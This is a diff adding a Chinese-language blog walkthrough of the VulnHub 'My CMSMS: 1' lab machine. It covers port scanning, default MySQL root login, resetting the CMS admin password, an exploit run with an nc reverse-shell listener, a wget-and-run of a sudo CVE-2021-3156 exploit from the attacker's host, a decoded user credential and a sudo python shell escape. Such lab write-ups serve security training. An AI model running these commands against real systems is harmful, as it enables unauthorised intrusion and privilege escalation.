@@ -700,4 +700,127 @@
         <tag>reverse shell</tag>
       </tags>
   </entry>
+  <entry>
+    <title>My CMSMS Walkthrough</title>
+    <url>/2025/03/19/MyCMSMS/</url>
+    <content><![CDATA[<h1 id="My-CMSMS-Walkthrough"><a href="#My-CMSMS-Walkthrough" class="headerlink" title="My CMSMS Walkthrough"></a>My CMSMS Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：[My CMSMS: 1](<a href="https://www.vulnhub.com/entry/my-cmsms-1,498/">My CMSMS: 1 ~ VulnHub</a>)</p>
+<p><img src="/picture/image-20250325194806444.png" alt="image-20250325194806444"></p>
+<h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>先做全端口扫描</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- 172.16.33.103</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250318105230162.png" alt="image-20250318105230162"></p>
+<p>以及应用版本发现</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p22,80,3306,33060 -A 172.16.33.103</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250318105330821.png" alt="image-20250318105330821"></p>
+<p>仅发现了 HTTP 服务端的 CMS Made Simple ，并没有获得其他有用的信息。似乎 33036 端口枚举失败了，尝试进一步探测：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p33060 -A -T4 172.16.33.103</span><br></pre></td></tr></table></figure>
+
+<p>好吧看来还是失败了</p>
+<p><img src="/picture/image-20250318105548168.png" alt="image-20250318105548168"></p>
+<p>先从 22 端口开始，尝试利用配置缺陷，以 root 身份登陆，看看有没有泄露信息</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh root@172.16.33.103                                       </span><br></pre></td></tr></table></figure>
+
+<p>泄露了 HTTP 服务的 CMS：CMSMS 及作者信息</p>
+<p><img src="/picture/image-20250318105716413.png" alt="image-20250318105716413"></p>
+<p>让我们来看看 80 端口，先做一个目录扫描：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://172.16.33.103/</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250318110628253.png" alt="image-20250318110628253"></p>
+<p>发现 phpinfo 访问，发现泄露 mycmsms 版本：4.19.8 </p>
+<p><img src="/picture/image-20250318113200016.png" alt="image-20250318113200016"></p>
+<blockquote>
+<p> 十分遗憾的是，直接搜索 My CMSMS exploit 跳出来的直接是该靶机的解题过程，这不是我的本意</p>
+</blockquote>
+<p>可以在主页面左下角找到 CMS Made Simple 版本 2.2.13</p>
+<p><img src="/picture/image-20250318120029915.png" alt="image-20250318120029915"></p>
+<p>去寻找下 CMS Made Simple 2.2.13 漏洞。遗憾的是，搜索到的漏洞都与要登陆 &#x2F;admin 后才能利用：</p>
+<p><img src="/picture/image-20250318120627194.png" alt="image-20250318120627194"></p>
+<p>可以在这里发现后台登陆页面：</p>
+<p><img src="/picture/image-20250318202509495.png" alt="image-20250318202509495"></p>
+<p>尝试 admin&#x2F;admin ，admin&#x2F;passwd 等弱口令登陆，可惜失败了，同时发现，后台对于输出做了限制，防止用户名泄露</p>
+<p><img src="/picture/image-20250318202825982.png" alt="image-20250318202825982"></p>
+<p>更改 POST 数据，看看有没有 SQL 注入漏洞，也失败了：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&#x27;&quot;%)#--%23&amp;password=admin&#x27;&quot;%)#--%23&amp;loginsubmit=Submit&#x27;&quot;%)#--%23</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250318203122088.png" alt="image-20250318203122088"></p>
+<p>来看下 3306 端口吧，尝试默认密码组合登陆：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -h 172.16.33.103 -uroot -proot --skip-ssl-verify-server-cert </span><br></pre></td></tr></table></figure>
+
+<p>十分幸运，登陆成功了：</p>
+<p><img src="/picture/image-20250318210954301.png" alt="image-20250318210954301"></p>
+<p>查看数据库：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MySQL [(none)]&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| cmsms_db           |</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| sys                |</span><br><span class="line">+--------------------+</span><br><span class="line">5 rows in set (0.053 sec)</span><br></pre></td></tr></table></figure>
+
+<p>使用 cmsms_db 数据库，查看数据表：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MySQL [(none)]&gt; use cmsms_db;</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">MySQL [cmsms_db]&gt; show tables;</span><br><span class="line">+--------------------------------+</span><br><span class="line">| Tables_in_cmsms_db             |</span><br><span class="line">+--------------------------------+</span><br><span class="line">| cms_additional_users           |</span><br><span class="line">| cms_additional_users_seq       |</span><br><span class="line">| cms_admin_bookmarks            |</span><br><span class="line">| cms_admin_bookmarks_seq        |</span><br><span class="line">| cms_adminlog                   |</span><br><span class="line">| cms_content                    |</span><br><span class="line">| cms_content_props              |</span><br><span class="line">| cms_content_props_seq          |</span><br><span class="line">| cms_content_seq                |</span><br><span class="line">| cms_event_handler_seq          |</span><br><span class="line">| cms_event_handlers             |</span><br><span class="line">| cms_events                     |</span><br><span class="line">| cms_events_seq                 |</span><br><span class="line">| cms_group_perms                |</span><br><span class="line">| cms_group_perms_seq            |</span><br><span class="line">| cms_groups                     |</span><br><span class="line">| cms_groups_seq                 |</span><br><span class="line">| cms_layout_design_cssassoc     |</span><br><span class="line">| cms_layout_design_tplassoc     |</span><br><span class="line">| cms_layout_designs             |</span><br><span class="line">| cms_layout_stylesheets         |</span><br><span class="line">| cms_layout_templates           |</span><br><span class="line">| cms_layout_tpl_addusers        |</span><br><span class="line">| cms_layout_tpl_categories      |</span><br><span class="line">| cms_layout_tpl_type            |</span><br><span class="line">| cms_locks                      |</span><br><span class="line">| cms_mod_cmsjobmgr              |</span><br><span class="line">| cms_mod_filepicker_profiles    |</span><br><span class="line">| cms_module_deps                |</span><br><span class="line">| cms_module_news                |</span><br><span class="line">| cms_module_news_categories     |</span><br><span class="line">| cms_module_news_categories_seq |</span><br><span class="line">| cms_module_news_fielddefs      |</span><br><span class="line">| cms_module_news_fieldvals      |</span><br><span class="line">| cms_module_news_seq            |</span><br><span class="line">| cms_module_search_index        |</span><br><span class="line">| cms_module_search_items        |</span><br><span class="line">| cms_module_search_items_seq    |</span><br><span class="line">| cms_module_search_words        |</span><br><span class="line">| cms_module_smarty_plugins      |</span><br><span class="line">| cms_module_templates           |</span><br><span class="line">| cms_modules                    |</span><br><span class="line">| cms_permissions                |</span><br><span class="line">| cms_permissions_seq            |</span><br><span class="line">| cms_routes                     |</span><br><span class="line">| cms_siteprefs                  |</span><br><span class="line">| cms_user_groups                |</span><br><span class="line">| cms_userplugins                |</span><br><span class="line">| cms_userplugins_seq            |</span><br><span class="line">| cms_userprefs                  |</span><br><span class="line">| cms_users                      |</span><br><span class="line">| cms_users_seq                  |</span><br><span class="line">| cms_version                    |</span><br><span class="line">+--------------------------------+</span><br><span class="line">53 rows in set (0.035 sec)</span><br></pre></td></tr></table></figure>
+
+<p>查看 cms_users 信息，发现 admin 哈希密码 <code>fb67c6d24e756229aab021cea7605fb3</code> ：</p>
+<p><img src="/picture/image-20250318211324263.png" alt="image-20250318211324263"></p>
+<p>查看该密文是由什么加密：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hash-identifier fb67c6d24e756229aab021cea7605fb3</span><br></pre></td></tr></table></figure>
+
+<p>看起来最有可能是 MD5</p>
+<p><img src="/picture/image-20250318211936574.png" alt="image-20250318211936574"></p>
+<p>看看能不能用 hashcat 的字典模式暴力破解出来：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -a 0 -m 0 fb67c6d24e756229aab021cea7605fb3 /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p>可惜没跑出来</p>
+<p><img src="/picture/image-20250318212045908.png" alt="image-20250318212045908"></p>
+<p>由于是 root 权限，看看能不能直接更改密码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MySQL [cmsms_db]&gt; update cms_users set password = MD5(&#x27;123456&#x27;) where username = &#x27;admin&#x27;;</span><br><span class="line">Query OK, 1 row affected (0.037 sec)</span><br><span class="line">Rows matched: 1  Changed: 1  Warnings: 0</span><br></pre></td></tr></table></figure>
+
+<p>使用 admin &#x2F; 123456 登陆看看，还是失败了</p>
+<p><img src="/picture/image-20250318213254470.png" alt="image-20250318213254470"></p>
+<p>既然已知 CMS 的版本，那岂不是可以去网上搜索 admin 账户的密码的加密方式？说干就干，在网站搜索 CMS Made Simple admin password </p>
+<p>幸运的是，在 <a href="https://cmscanbesimple.org/blog/cms-made-simple-admin-password-recovery">CMS Made Simple Admin password recovery</a> 中找到了 admin 密码的加密方式：</p>
+<p><img src="/picture/image-20250318215218448.png" alt="image-20250318215218448"></p>
+<p>稍作更改：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update cms_users set password = (select md5(CONCAT(IFNULL((SELECT sitepref_value FROM cms_siteprefs WHERE sitepref_name = &#x27;sitemask&#x27;),&#x27;&#x27;),&#x27;123&#x27;))) where username = &#x27;admin&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>成功进入后台：</p>
+<p><img src="/picture/image-20250318215409826.png" alt="image-20250318215409826"></p>
+<p>使用 <a href="https://dev.cmsmadesimple.org/bug/view/12275">https://dev.cmsmadesimple.org/bug/view/12275</a> 中的 exp 尝试 RCE</p>
+<p><img src="/picture/image-20250318220216279.png" alt="image-20250318220216279"></p>
+<p>利用失败，尝试扩大利用范围，使用版本相近的 2.2.14 exp 代码：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit -m 48779</span><br><span class="line">python 48779.py --url http://172.16.33.103/admin/login.php -u admin -p 123 -lhost 10.8.0.90 -lport 1234</span><br><span class="line">nc -nvlp 1234</span><br></pre></td></tr></table></figure>
+
+<p>getshell ：</p>
+<p><img src="/picture/image-20250318222649383.png" alt="image-20250318222649383"></p>
+<p><img src="/picture/image-20250318222710238.png" alt="image-20250318222710238"></p>
+<p>接下来是提权，查看 sudo 版本</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -V</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250319182043155.png" alt="image-20250319182043155"></p>
+<p>搜索对应版本 sudo 漏洞利用代码：CVE-2021-3156</p>
+<p>上传至目标主机</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://10.8.0.90:4444/exp.py</span><br><span class="line"><span class="built_in">chmod</span> +x exp.py</span><br><span class="line">python exp.py</span><br></pre></td></tr></table></figure>
+
+<p>提权成功</p>
+<p><img src="/picture/image-20250319182951767.png" alt="image-20250319182951767"></p>
+<p>或者在 &#x2F;var&#x2F;www&#x2F;html&#x2F;admin 目录下发现 .htpasswd 文件，内容为密文 <code>TUZaRzIzM1ZPSTVGRzJESk1WV0dJUUJSR0laUT09PT0=</code></p>
+<p>使用 cyberchef 的 magic 方法破解出账户和密码：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">armour:Shield@123</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250319183333186.png" alt="image-20250319183333186"></p>
+<p>切换至 armour 用户</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">su armour</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250319183733223.png" alt="image-20250319183733223"></p>
+<p>该用户具有 pyhon sudo 权限</p>
+<p><img src="/picture/image-20250319184057890.png" alt="image-20250319184057890"></p>
+<p>使用 python 提权：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo python -c <span class="string">&#x27;import os; os.system(&quot;/bin/sh&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>提权成功</p>
+<p><img src="/picture/image-20250319184130060.png" alt="image-20250319184130060"></p>
+]]></content>
+      <categories>
+        <category>Penetration Testing</category>
+      </categories>
+      <tags>
+        <tag>Penetration Testing</tag>
+        <tag>vulnhub</tag>
+      </tags>
+  </entry>
 </search>
